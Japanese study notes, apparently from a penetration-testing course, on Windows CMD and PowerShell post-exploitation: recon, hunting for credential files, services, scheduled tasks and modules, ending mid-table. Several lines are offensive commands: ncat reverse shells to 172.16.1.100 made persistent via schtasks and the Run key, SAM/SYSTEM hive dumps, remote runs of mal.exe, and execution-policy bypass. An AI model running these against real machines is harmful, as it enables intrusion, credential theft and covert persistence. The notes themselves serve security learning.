# 1 CMD(MS DOS shell)
* cmd.exeのパス：`C:\Windows\System32\cmd.exe`
* helpコマンド：help %cmd% , コマンド /?  (基本、マニュアルを確認すればなんでも行けるからまずマニュアルみろおおお)
* 使えるショートカット


## (1) ナビゲーション
* dir  - ディレクトリ内のファイルを一覧表示
* cd   - 移動(引数なしだと、カレントディレクトリのパスを教えてくれるよ)
* tree - ファイルシステムの内容の一覧表示(設定、プロジェクト ファイルやフォルダー、さらには究極の目標であるパスワードを含むファイルやフォルダーなど、必要な重要な情報を含むファイルやフォルダーを検索するときに非常に便利)
> ```
> tree /F (指定されたパス内のすべてのファイルとフォルダーの一覧を取得する)
> ```

### ① 興味深いファイル
侵入後の権限昇格のために使えるディレクトリだよ
| 名前                     | 場所                           | 説明                                                                                           |
|------------------------|------------------------------|------------------------------------------------------------------------------------------------|
| %SYSTEMROOT%\Temp     | C:\Windows\Temp              | グローバルなディレクトリで、全ユーザーがアクセスできる一時的なシステムファイルを含む。全ユーザーにフルアクセス権が与えられている。低特権ユーザーがファイルをドロップするのに便利。  |
| %TEMP%                 | C:\Users\<user>\AppData\Local\Temp | ユーザー専用の一時ファイルを含むローカルディレクトリ。フォルダの所有者にフルオーナーシップが与えられる。ローカルまたはドメインに参加しているユーザーアカウントを攻撃者が取得した際に便利。  |
| %PUBLIC%               | C:\Users\Public              | インタラクティブログインアカウントがファイルやサブフォルダに対してフルアクセスできる公共アクセス可能なディレクトリ。監視が少ないため、グローバルWindows Tempディレクトリの代替として利用可能。 |
| %ProgramFiles%         | C:\Program Files             | システムにインストールされているすべての64ビットアプリケーションが含まれるフォルダ。ターゲットシステムにインストールされているアプリケーションを確認するのに便利。                  |
| %ProgramFiles(x86)%    | C:\Program Files (x86)      | システムにインストールされているすべての32ビットアプリケーションが含まれるフォルダ。ターゲットシステムにインストールされているアプリケーションを確認するのに便利。                   |
| %HOME%                 | C:\Users\%user%             | ユーザが作業しているところなので、いろいろ置かれている。認証情報等のメモや、そのほか、内部に関する情報が含まれる可能性がある。 |

## (2) ディレクトリとファイル操作
* 大体のやつは、/Aオプションが使えて、ファイル属性を指定できるよ(秘密ファイルとか)
* パイプ、リダイレクションはlinuxと変わらない。
* 連続実行は、「&」で、前の実行の可否に依存するのは「&&」

### ① ディレクトリの作成、削除
mkdir - ディレクトリ作成  
rd    - ディレクトリ削除(/sオプションでディレクトリの中身も含めて削除できる)  
  
### ② ファイルの表示
more - ファイルの中身を見れるよ。linuxのlessみたいな感じ。「|」パイプを利用すれば、コマンド実行の結果を見るのも楽だよ(/Sオプションを利用すると結構見やすい)  
> ```
> ◇ パイプを利用したやつ
> systeminfo | more  
> ```
  
type - シンプルにファイルの中身を一気に表示するよ。「>>」のリダイレクションを利用すれば、ファイルのテキストをまとめるのが楽だよ。  
> ```
> ◇ リダイレクションを利用してファイルのテキストをほかのファイルにまとめる
> type passwords.txt >> secrets.txt
> ```

### ③ ファイルの作成、削除
`echo` - 標準出力を出してくれるやつ(こいつで、リダイレクションしてファイル作れる)  
`del,erase` - ファイル削除、二つあるのは、互換性を保つためあるだけよ  

### ④ ファイル、ディレクトリの移動、コピー
`move` - ファイル、ディレクトリの移動  
`copy` - ファイル、ディレクトリのコピー  
`xcopy`　- copyの拡張(copyより細かいコピーができるよ。ディレクトリごとコピーが/E、属性情報を変えないとかなら/K)  
`robocopy` - xcopyの拡張  

## (3) システム情報の収集
![image](https://github.com/user-attachments/assets/0cc0df07-793e-4312-827f-52faf6f471e0)

◇ システム情報のタイプ  
　一般システム情報 - 固有のOS情報やhost名、適用されているパッチなど。マシンの役割やOSに起因する脆弱性を調べることができる。  
　ネットワーク情報 - IPアドレスやARPテーブル、hostsの情報、ネットワークの接続状態など。ネットワークのマッピングができ、内部ネットワークを解明できる。  
　ドメイン情報 - ドメインに参加しているか。参加していたら、Domain(AD)等の分析を行う。  
　ユーザ情報 - ユーザ名、ユーザの所属グループ、ユーザの権限など。  


※特定のコマンドが他のコマンドよりも厳密に監視および追跡されている場合、情報を収集する方法を 1 つだけ知っていても効率的ではありません。このため、必要な情報を収集し、可能な限り検出を逃れるためには、確立された複数の方法が必要  

### ① 一般システム情報の収集
> ```
> ◇ systeminfo
> - OS情報、ホスト名、IP アドレス、ドメインに属しているかどうか、インストールされている修正プログラムなど
>
> ◇ hostname
> - ホスト名
>
> ◇ ver
> - OSバージョン情報
>
> ◇ time /t
> - システムの時刻
>
> ◇ 「fsutil fsinfo drives」
> - マウントされているドライブの確認
> ```

### ② ネットワーク情報
> ```
> ipconfig /all
> - ドメイン名、IPアドレス、サブネットマスク、デフォルトゲート、MACアドレス、DHCP設定、DNS設定など
>
> arp /a
> - ARPテーブル(ターゲットがどのホストと接続したかを確認でき、アクセスできる可能性の高いIPがわかる)
> 
> type C:\windows\system32\drivers\etc\hosts
> - hostsファイルの情報からレガシーシステム等のドメイン情報などが取得できる
>
> netstat -ano
> - ポートの接続状況(どこと通信をしているかを把握できる)
>
> 「netsh winhttp show proxy」
> - プロキシ設定の表示
> ```

#### -コラム- ポートの接続状況からわかること
* 外部のサーバ等との連携や接続  
クラウドにサーバがあったり、サーバを分散している場合、外部のネットワークのIPと通信している可能性がある
  
* セキュリティ構成を推定  
動いているセキュリティソフトと合わせてみることで、どのような構成のセキュリティシステムが実際に施されているのか推定することができるんじゃね。
具体的には、監視ソフトが利用されているとか、どこが監視用サーバとかが、わかるかもしれない。どのような形態でセキュリティソフトがりよされているかとか

* RDPとかの通信があったら  
セッションを乗っ取ることができるかもしれない
### ② ユーザ情報
> ```
> ◇ 自身のユーザ情報を取得
> whoami
> - オプション無し  ログインユーザの参加ドメイン、ユーザ名
> - /priv          ログインユーザの権限情報
> - /groups        ログインユーザの所属グループ
> - /all           ログインユーザのSID、参加ドメイン、ユーザ名、所属グループ、権限情報(上にあるやつ全て表示)
> set user (ユーザ関連の環境変数を表示させる)
> - ログインユーザのユーザ名、参加ドメイン、
> 
> set
> - 環境変数の値を列挙
> 
> net share       (現在侵害を受けているユーザーがアクセスできる共有のリストが分かる)
> - 共有情報の列挙
>
> net view
> - 共有リソースの列挙
>
> net start
> - 起動中のサービスを表示
>
> net config server (サーバーサービスの構成情報を確認する)
> - サーバ名、OSバージョン、最大ユーザ数、最大セッション数
>
> net config workstation (ワークステーションサービスの構成情報を確認する)
> - マシン名、ユーザ名、OSバージョン、使用ドメインなどの情報
> 
> ◇ ほかのユーザ情報の取得
> net user
> - オプション無し  ローカルユーザの列挙
> - /domain        参加ドメイン内のユーザの列挙
> - ユーザ名を指定  ユーザのアカウント情報や所属グループ等(ドメインユーザなら/domainをつける必要がある)
> 
> ◇ ほかのグループ情報の取得
> net localgroup   ローカルグループに所属するユーザ一覧取得
> - オプション無し  ローカルグループ名の列挙
> - グループ指定    指定したローカルグループに参加しているユーザ名
>
> net group        特定ドメインのグループに所属するユーザ一覧取得
> - オプション無し  ドメイングループ名を列挙
> - /domain        ドメインを指定する(デフォルト : 自分が参加しているドメイン)
> - グループ指定    指定したドメイングループに参加しているユーザ名
>
> ◇ AD情報の収集
> dsquery
> - Active Directoryに含まれるアカウントの検索
>
> csvde
> - Active Directoryに含まれるアカウント情報取得
> ```

### ④ コマンドによるシステム情報の列挙などのシステム内での情報収集について
これは、限られたリソースの中で、CMDを使用してどのようにアクセスし、アセスメントを継続できるかを簡単に示したものである。 
* このルートは非常にノイズが多く、半端な能力を持つブルーチームにさえいずれは気づかれてしまうことを心に留めておいてください。
* 現状では、私たちは大量のログを書き、複数のホストに痕跡を残していますが、彼らのEDRやNIDSが何を見ることができたかについてはほとんど何もわかりません。

## --コラム-- どのようにすればノイズが少ないのか？
◇ コマンドからでなく、設定ファイル等の内容を「type」コマンドなどで表示する形ならどうだろうか  
⇒　参照できる設定ファイルからシステム情報を読み取る方法  
  
◇ 利用できるプログラム、サービスを探したいのであれば、`C:\Program Files (x86)`配下のディレクトリを列挙するとか  
⇒　特定のディレクトリの配下のファイル、ディレクトリの列挙によりシステム情報を読み取る方法

◇ OSやプログラムの更新、サービスやドライバーの使用をファイルのタイムスタンプで推測する。  
⇒　`dir`の`/T:`オプションを利用する
  
が、自分的に考えられたよ。
### ① dirによるインストールの列挙、サービスの列挙、ドライバーの列挙(使用されているかどうかは、ファイルタイムスタンプの履歴とかで分かるはず)
| 項目                          | ディレクトリ                                                                                         | コマンド                                      |
|-------------------------------|------------------------------------------------------------------------------------------------------|-----------------------------------------------|
| **32ビットアプリケーション** | `C:\Program Files (x86)`                                                                              | `dir "C:\Program Files (x86)" /s`             |
| **64ビットアプリケーション** | `C:\Program Files`                                                                                    | `dir "C:\Program Files" /s`                   |
| **Windowsアプリ (UWP)**      | `C:\Program Files\WindowsApps`                                                                        | `dir "C:\Program Files\WindowsApps" /s`       |
| **スタートアップ (全ユーザー)**| `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp`                                       | `dir "C:\ProgramData\...\StartUp" /s`         |
| **スタートアップ (ユーザー)** | `C:\Users\<ユーザー名>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\StartUp`                | `dir "C:\Users\...\StartUp" /s`               |
| **サービス実行**      | `C:\Windows\System32`                                                                                 | `dir "C:\Windows\System32" /s`                |
| **インストールされているドライバー**       | `C:\Windows\System32\drivers`                                                                         | `dir "C:\Windows\System32\drivers" /s`        |


### ② ファイルのタイムスタンプからの読取り(例：OSのライセンス情報)
ファイルパス：C:\Windows\System32\license.rtf

#### dirコマンドのタイムスタンプオプション(/T)
/T:C - 作成日時をタイムフィールドに出力  
/T:A - 最終アクセス日時をタイムフィールドに出力  
/T:W - 最終更新日時をタイムフィールドに出力  

1. 最終更新日時  
  ◇ indowsのインストール時期  
  　license.rtf ファイルは、Windowsがインストールされたときに作成されるため、最終更新日時がインストールの日付に近い場合、そのOSがインストールされた日を示しています。  
   　    
  ◇ OSのアップデート  
  　タイムスタンプが最近であれば、Windowsのアップデートやパッチ適用時にファイルが更新された可能性があります。この場合、最新のアップデートに関連する変更があったことを示唆しています。  

3. 最終アクセス日時  
  ◇ システムの利用状況  
  　最終アクセス日時が最近であれば、ユーザーがファイルを参照したか、何らかの理由で使用された可能性があります。これにより、ユーザーのアクティビティやシステム管理の状況が推測できるかもしれません。  

4. 作成日時  
  ◇ OSの初期設定  
  　この日時は、通常、OSの初期インストール時のタイムスタンプであるため、そのOSがいつ導入されたのかを知る手がかりとなります。  

◇ 推測の限界  
 * ファイルが削除されたり再作成された場合  
   タイムスタンプが更新されることがあります。たとえば、ファイルが削除されて新たに作成された場合、作成日時が変わります。  
 * 更新の頻度  
   Windows Updateが定期的に行われるため、ファイルのタイムスタンプが頻繁に更新されることがありますが、その内容の変更は直接的に示されないことがあります。  

### ③ まとめ
なんかやってることが、デジタルフォレンジックのファイルシステムの解析に似ていた。  
ファイルシステムの構造を知っていると、コマンドに頼らなくてもある程度内部偵察や脆弱性の探索ができそうだと感じた。  
フォレンジックの技術が攻撃者にも利用できると感じた。  

## (4) ファイルとディレクトリの検索
コンフィグファイルや興味深い認証に関連するファイル、企業の機密ファイルとかを探すときに使える。

1. ファイル検索 - Where   
◇ コマンドのファイルパスの検索
> ```
> where cmd.exe
> ```
◇ 指定したフォルダ以下に対するファイル名の検索(再帰的な検索)  
> ```
> where /R %dir% %filename%
> ```
※ワイルドカードを利用できる  
  
◇ 再帰的検索とワイルドカードを利用した。txtファイルの検索  
> ```
> where /Users/ *.txt
> ```

2. 文字列検索 - find,findstr (「findstr」がlinuxでいうgrepみたいなやつになっているからそっち使った方がいい,ちな正規表現使える)

3. 比較 - comp,fc (linuxのdiffとかわらん)

4. 整列、一意化 - sort (/uniqueオプションで重複を消せる)

### --コラム-- この会で出たの問題のflagについて
flagが -> RmxhZ3MgYXJlbid0IGhhcmQgdG8gZmluZCBub3csIHJpZ2h0Pw==だった  
  
これはBASE64でHTTPとかで文字のみでデータを送りたいときにこのようにエンコードする

#### ■ デコードしてみた
certutilを用いる  
```
echo RmxhZ3MgYXJlbid0IGhhcmQgdG8gZmluZCBub3csIHJpZ2h0Pw== > md5.txt
certutil -decode md5.txt decode.txt
type decode.txt

Flags aren't hard to find now, right?
```
今では旗を見つけるのは難しくありませんよね？とか書かれてた（笑）。

#### ■ cetutilについて
もとは、デジタル証明書とか用の検証とかいろいろ行うためのツールだが、こいつは、めっちゃいろいろなツールとして使える  
  
◇ ファイルのハッシュ値を求めるツールとして  
-hashfile  
  
◇ BASE64にエンコードデコードするツールとして  
-encode、-decode  
  
◇ URLからファイルを落とすツールとして  
-URLCache  

## (5) 環境変数
### ① 変数のスコープ
グローバルスコープ：  
グローバル変数はアクセス可能ですglobally。このコンテキストでは、グローバル スコープにより、プログラム内のどこからでも変数内に格納されたデータにアクセスして参照できることがわかります。  
  
ローカルスコープ：  
ローカル変数はlocalコンテキスト内でのみアクセスできます。Localつまり、これらの変数内に格納されたデータは、それが宣言された関数またはコンテキスト内でのみアクセスおよび参照できます。  

### ②　変数の作成
◇ ローカル変数の作成　 - `set <hensu>=<value>`  
  
◇ グローバル変数の作成 - `setx <hensu> <value>`  

### ③ 重要な環境変数
<table class="table table-striped text-left">
<thead>
<tr>
<th><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">変数名</font></font></th>
<th><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">説明</font></font></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>%PATH%</code></td>
<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">実行可能プログラムが配置されているディレクトリ (場所) のセットを指定します。</font></font></td>
</tr>
<tr>
<td><code>%OS%</code></td>
<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ユーザーのワークステーション上の現在のオペレーティング システム。</font></font></td>
</tr>
<tr>
<td><code>%SYSTEMROOT%</code></td>
<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">に展開されます</font></font><code>C:\Windows</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。Windows システム フォルダーを含む、システム定義の読み取り専用変数です。重要なデータ、コア システム バイナリ、構成ファイルなど、Windows がコア機能にとって重要と見なすものはすべてここにあります。</font></font></td>
</tr>
<tr>
<td><code>%LOGONSERVER%</code></td>
<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">現在アクティブなユーザーのログイン サーバーと、それに続くマシンのホスト名を提供します。この情報を使用して、マシンがドメインまたはワークグループに参加しているかどうかを確認できます。</font></font></td>
</tr>
<tr>
<td><code>%USERPROFILE%</code></td>
<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">現在アクティブなユーザーのホーム ディレクトリの場所を提供します。 に展開されます</font></font><code>C:\Users\{username}</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></td>
</tr>
<tr>
<td><code>%ProgramFiles%</code></td>
<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">と同等です</font></font><code>C:\Program Files</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。この場所は、ベース システム上のすべてのプログラムがインストールされる場所です</font></font><code>x64</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></td>
</tr>
<tr>
<td><code>%ProgramFiles(x86)%</code></td>
<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">と同等です</font></font><code>C:\Program Files (x86)</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。この場所には、実行中のすべての 32 ビット プログラム</font></font><code>WOW64</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">がインストールされます。この変数は 64 ビット ホストでのみアクセス可能であることに注意してください。これは、対話しているホストの種類を示すために使用できます。(</font><font style="vertical-align: inherit;">アーキテクチャ</font></font><code>x86</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">とは対照的)</font></font><code>x64</code><font style="vertical-align: inherit;"></font></td>
</tr>
</tbody>
</table>

## (6) サービス管理
永続化にも利用できるし、脆弱性のあるサービスが動いていたら、権限昇格にも利用できる

### ① 稼働しているサービスの列挙
◇ scコマンド - `sc query type= service`  
  
◇ tasklistコマンド - `tasklist /svc`  
  
◇ ネットスタート - `net start`  
  
◇ wmicの利用 - `wmic service list brief`  
  
※ここから気になったやつは、それぞれのコマンドで個々のサービスを検索できる
### ② サービスを操作するとき
サービスの依存関係を考えて操作する必要がある

#### 例 Windows updateの停止(wuauserv)
Windows updateを停止するためには、二つのサービスを消す必要がある
* wuauserv (Windows アップデート サービス)
* bits (バックグラウンド インテリジェント転送サービス)

### ③ Windows Defender(windefend)
SYSTEM権限がなければこれを停止することができない。現最新OSのWiondows11では、セーフティモードでないとディフェンダーを無効化できなくなっている。

## (7) タスクスケジュール
永続化にも利用できるし、脆弱性のあるスクリプトがタスクとして動いていたら、権限昇格にも利用できる。  
  
マルウェア ⇒ 行動がばれないように特定の時間や場所、イベント発生で動くように作られているものがある。  

### ① タスクスケジュールするトリガー
* 特定のシステム イベントが発生したとき。
* 特定の時間に。
* 毎日のスケジュールの特定の時間。
* 毎週のスケジュールに従って特定の時間に。
* 月ごとのスケジュールに従って特定の時間に。
* 月ごとの曜日スケジュールの特定の時間。
* コンピュータがアイドル状態になったとき。
* タスクが登録されたとき。
* システムが起動したとき。
* ユーザーがログオンするとき。
* ターミナル サーバー セッションの状態が変わったとき。

などがある。
### ② schtasks によるタスクスケージュール管理
◇ すべてのタスクスケジュールの詳細をリストする  
```
SCHTASKS /Query /V /FO list
```
  
◇ 新しいタスクをスケジュールする(例： リバースシェルによる永続化)
```
schtasks /create /sc ONSTART /tn "My Secret Task" /tr "C:\Users\Victim\AppData\Local\ncat.exe 172.16.1.100 8100"
```

◇ リモートマシンへ新しいタスクをスケジュールする.
※細かいところはマニュアル見ろよ

### ③ 他のコマンドによるリモートに対するタスクのスケージュールを実行
◇ at (Windows 11では、廃止されている)  
```
at \\[リモートホスト名 or IPアドレス] 12:00 cmd /c "C:\windows\temp\mal.exe"
```
  
◇ wmic  
```
wmic /node:[IPアドレス] /user:”[ユーザ名]” /password:”[パスワード]” process call create “cmd /c c:\Windows\System32\net.exe user”
```
## --コラム--
(6)と(7)で扱ったものは、リモートで実行させることが可能。  
リモートのマシンへの資格情報等があれば、リモートマシンに対して、任意のタスクをスケジュールしたり、任意のサービスを実行させることが、できる  
⇒ 横展開(マルウェアなら感染を拡大するために利用できる)

## (8) レジストリの操作
### ① regによるレジストリ操作
◇ SAM、SYSTEM等のレジストリハイブの出力
```
reg save hklm\system system
reg save hklm\sam sam
```

◇ ユーザログオン時に実行するファイルを指定  
```
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v hello_value /t REG_SZ /d "C:\Users\Victim\AppData\Local\ncat.exe 172.16.1.100 8100" 
```

# 2 PowerShell
## (1) cmd vs Powershell
### ① cmdとPowerShellの比較
<table class="table table-striped text-left">
<thead>
<tr>
<th><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">特徴</font></font></strong></th>
<th><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">CMDF</font></font></strong></th>
<th><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">パワーシェル</font></font></strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">言語</font></font></td>
<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">バッチおよび基本的な CMD コマンドのみ。</font></font></td>
<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PowerShell は、バッチ、CMD、PS コマンドレット、およびエイリアスを解釈できます。</font></font></td>
</tr>
<tr>
<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">コマンドの使用</font></font></td>
<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">あるコマンドの出力を別のコマンドに直接渡すことはできません。</font></font></td>
<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">あるコマンドの出力を別のコマンドに直接渡すことができます。</font></font></td>
</tr>
<tr>
<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">コマンド出力</font></font></td>
<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">テキストのみ</font></font></td>
<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PowerShell はオブジェクト形式で出力します。</font></font></td>
</tr>
<tr>
<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">並列実行</font></font></td>
<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">CMD は、別のコマンドを実行する前に 1 つのコマンドを終了する必要があります。</font></font></td>
<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PowerShell は、コマンドをマルチスレッド化して並列実行できます。</font></font></td>
</tr>
</tbody>
</table>

### ② セキュリティ的なところ
◇ コマンドログを残すか  
　`cmd.exe`　　　⇒ 残さない  
　`powershell`　 ⇒ 残す  
　  
◇ 実行ポリシー  
　`cmd.exe`　　　⇒ なし  
　`powershell`　 ⇒ あり(回避策は、普通にある)  
  
  
### ③ 結論 
◇ よって実行ポリシーを避けたり、できるだけまだバレたくない(ステルス性を重視する)場合  
　`cmd.exe`
　  
◇ それ以外  
　`powershell`

## (2) powershellの利用
### ① powershellの利用場面例
Windows システムが管理されているシステム管理者、侵入テスト担当者、SOC アナリスト、その他多くの技術分野で広く使用されています。  
Windows サーバー、デスクトップ (Windows 10 および 11)、Azure、Microsoft 365 クラウドベースのアプリケーションで構成される IT 環境を管理する IT 管理者と Windows システム管理者について考えてみましょう。  
彼らの多くは、毎日実行する必要があるタスクを自動化するために PowerShell を使用している  

◇ 次のようなタスクがあったりする
* サーバーのプロビジョニングとサーバーの役割のインストール
* 新入社員用の Active Directory ユーザー アカウントの作成
* Active Directory グループの権限の管理
* Active Directory ユーザー アカウントの無効化と削除
* ファイル共有権限の管理
* Azure AD および Azure VMとのやり取り
* ディレクトリとファイルの作成、削除、監視
* ワークステーションとサーバーに関する情報の収集
* ユーザー用の Microsoft Exchange メール受信トレイの設定 (クラウドおよび/またはオンプレミス)

### ② 基本的な操作
◇ ヘルプ  
　ヘルプの取得　　　　　- Get-Help  
　ヘルプのアップデート　- Update-Help  
　  
◇ カレントディレクトリの表示  
　 Get-Location    
　  
◇ ディレクトリの一覧表示  
　 Get-ChildItem  
　  
◇ ディレクトリの移動  
　 Set-Location  
　  
◇ コンテンツの取得(内容表示)  
　 Get-Content  
　  
◇ 画面をクリアする  
　cls  
　  
◇ 標準入力を表形式のフォーマットで出力する  
　Format-Table  
  
#### PowerShell の使用に関するヒントとコツ
◇ コマンド探し(Get-Command)  
no option - 利用できるコマンドレットを一覧表示  
`-verb`　 - 動詞(getなど)の指定  
`-noun`　 - 名詞(conntentsなど)の指定
　  
◇ エイリアス    
get-alias - エイリアスの一覧を表示  
set-alias - エイリアスを設定  
```
Set-Alias -Name gh -Value Get-Help
```
　  
◇ ヒストリ（Get-History)  
no option - このアクティブ セッション中に実行されたコマンドのみを表示  


##### 実行されたPowerShellコマンドの履歴
◇ すべてのPowerShellの実行履歴の保存ファイルのパス  
```
$($host.Name)_history.txt$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine
```
  
◇ 実行履歴のセキュリティについて  
認証情報につながるものは、フィルタリングされるようになっている  

#### 便利なエイリアス
<table class="table table-striped text-left">
<thead>
<tr>
<th><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">エイリアス</font></font></strong></th>
<th><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">説明</font></font></strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>pwd</code></td>
<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">gl も使用できます。このエイリアスは Get-Location の代わりに使用できます。</font></font></td>
</tr>
<tr>
<td><code>ls</code></td>
<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">dir と gci も ls の代わりに使用できます。これは Get-ChildItem のエイリアスです。</font></font></td>
</tr>
<tr>
<td><code>cd</code></td>
<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cd の代わりに sl と chdir を使用できます。これは Set-Location のエイリアスです。</font></font></td>
</tr>
<tr>
<td><code>cat</code></td>
<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">type と gc も使用できます。これは Get-Content のエイリアスです。</font></font></td>
</tr>
<tr>
<td><code>clear</code></td>
<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Clear-Host の代わりに使用できます。</font></font></td>
</tr>
<tr>
<td><code>curl</code></td>
<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Curl は Invoke-WebRequest の別名で、ファイルのダウンロードに使用できます。wget も使用できます。</font></font></td>
</tr>
<tr>
<td><code>fl and ft</code></td>
<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">これらのエイリアスを使用して、出力をリストおよびテーブル出力にフォーマットできます。</font></font></td>
</tr>
<tr>
<td><code>man</code></td>
<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">help の代わりに使用できます。</font></font></td>
</tr>
</tbody>
</table>

### ③ 便利なホットキー
<table class="table table-striped text-left">
<thead>
<tr>
<th><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ホットキー</font></font></strong></th>
<th><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">説明</font></font></strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>CTRL+R</code></td>
<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">検索可能な履歴になります。その後入力を開始すると、以前のコマンドに一致する結果が表示されます。</font></font></td>
</tr>
<tr>
<td><code>CTRL+L</code></td>
<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">画面を素早くクリアします。</font></font></td>
</tr>
<tr>
<td><code>CTRL+ALT+Shift+?</code></td>
<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">これにより、PowerShell が認識するキーボード ショートカットのリスト全体が印刷されます。</font></font></td>
</tr>
<tr>
<td><code>Escape</code></td>
<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">CLI に入力するときに、行全体をクリアしたい場合は、バックスペースキーを押す代わりに、</font></font><code>escape</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">を押すだけで行を消去できます。</font></font></td>
</tr>
<tr>
<td><code>↑</code></td>
<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">これまでの履歴を上にスクロールしてください。</font></font></td>
</tr>
<tr>
<td><code>↓</code></td>
<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">これまでの履歴を下にスクロールしてください。</font></font></td>
</tr>
<tr>
<td><code>F7</code></td>
<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">セッションからのスクロール可能なインタラクティブな履歴を含む TUI を表示します。</font></font></td>
</tr>
</tbody>
</table>

## (3) コマンドレットとモジュールについて　
### ① コマンドレット
コマンドレットは動詞-名詞構造に従っており、これにより、特定のコマンドレットが何を行うかを理解しやすくなります。

### ② モジュール
PowerShellモジュールは、使いやすく共有しやすいように構造化された PowerShell コードです。Microsoft の公式ドキュメントに記載されているように、モジュールは次の要素から構成されます。  
  
* コマンドレット
* スクリプトファイル
* 機能
* アセンブリ
* 関連リソース（マニフェストとヘルプファイル）

◇ Windowsを攻撃するためのモジュール(PowerSploit)  
　URL：https://github.com/PowerShellMafia/PowerSploit  

#### ■ psd1(モジュールマニフェストファイル)
PowerShellのデータファイル「.psd1」は、モジュールマニフェストファイル。以下のことが含まれる  
  
* 処理されるモジュールへの参照
* 主要な変更を追跡するためのバージョン番号
* GUID
* モジュールの作者
* 著作権
* PowerShell 互換性情報
* モジュールとコマンドレットが含まれています
* メタデータ

### ③ モジュールの操作
◇ ロードされているモジュールの一覧表示  
　- `Get-Module`  
　  
◇ インストールされているがセッションでロードされていないモジュールの表示　　
　- `Get-Module -ListAvailable`  
　  
◇ モジュールのロード  
　- `Import-Module .\PowerSploit.psd1`  (大体実行ポリシーで実行できない)  
  
#### ■ 実行ポリシーの変更
PowerShell スクリプトとモジュールを使用する際に考慮すべき重要な要素は、PowerShell の実行ポリシーです。Microsoft の公式ドキュメントに記載されているように、実行ポリシーはセキュリティ制御ではない。なので普通に解除できる。  
　  
◇ 実行ポリシーの確認  
　- `Get-ExecutionPolicy`  
　  
◇ 実行ポリシーの変更(プロセスに対し行う)  
```
Set-ExecutionPolicy -scope Process Bypass
```

#### ■ モジュール内のコマンドを探す
```
Get-Command -Module PowerSploit
```

#### ■ モジュールを検索
```
Find-Module -Name
```

### ④ PowerShellで知っておくべきツール
◇ AdminToolbox  
　AdminToolbox は、システム管理者が Active Directory、Exchange、ネットワーク管理、ファイルやストレージの問題などを扱うさまざまなアクションを実行できるようにする便利なモジュールのコレクションです。  
　  
◇ ActiveDirectory  
　このモジュールは、Active Directory に関するすべてのローカルおよびリモート管理ツールのコレクションです。これを使用して、ユーザー、グループ、権限などを管理できます。  
　  
◇ Empire / Situational Awareness  
　ホストおよびそれらが属するドメインの状況認識を提供する PowerShell モジュールとスクリプトのコレクションです。このプロジェクトは、BC SecurityによってEmpire Framework の一部として管理されています。  
　  
◇ Inveigh  
　Inveigh は、ネットワーク スプーフィングと中間者攻撃を実行するために構築されたツールです。  

◇ BloodHound / SharpHound  
　Bloodhound/Sharphound を使用すると、C# および PowerShell で記述されたグラフィカル分析ツールとデータ コレクターを使用して、Active Directory 環境を視覚的にマッピングできます。  
  
## (4) ユーザとグループの管理
### ① ユーザアカウントの種類
* サービスアカウント
* ビルドインアカウント
* ローカルユーザー
* ドメインユーザー
### ② ビルトインアカウント
<table class="table table-striped text-left">
<thead>
<tr>
<th><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">アカウント</font></font></strong></th>
<th><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">説明</font></font></strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>Administrator</code></td>
